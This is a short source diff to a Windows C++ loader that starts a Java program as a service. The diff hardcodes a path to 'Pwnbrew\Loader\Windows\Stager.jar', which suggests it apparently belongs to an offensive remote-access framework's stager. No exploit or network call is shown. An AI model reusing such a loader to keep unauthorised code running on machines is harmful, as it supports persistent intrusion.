@@ -1,3 +1,15 @@
+//***************************************************************
+/*  Author: Securifera
+/   Description: 
+/           This application sets up and runs the java application
+/   as a service.
+/
+/   Revision History:
+/           Fixed bug that was causing the service to close on 
+/                logoff.  Added -Xrs option to jvm startup arguments.
+*/
+//****************************************************************
+
 #include "jarldr.h"
 #include "..\log.h"
 #include "..\utilities.h"
@@ -9,7 +21,7 @@ JavaVM *vm;
 
 int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
 {
-	std::string jarPath("");
+	std::string jarPath("C:\\Pwnbrew\\Loader\\Windows\\Stager.jar");
 	InvokeMain( nullptr, jarPath);
 }
 
@@ -189,7 +201,7 @@ BOOL PrepareJava(std::string pJavaVersion, std::string& sJavaPath ){
 	//Set to runtime 7
 	genericRuntime2.append("jre7");	
 
-	std::string javaPath;
+	std::string javaPath(JAVADIR);
     //Set to x86 dir if 64bit since we are x86
 	if( IsWow64() && FileExists(JAVADIR_X64)){
 		javaPath = JAVADIR_X64;
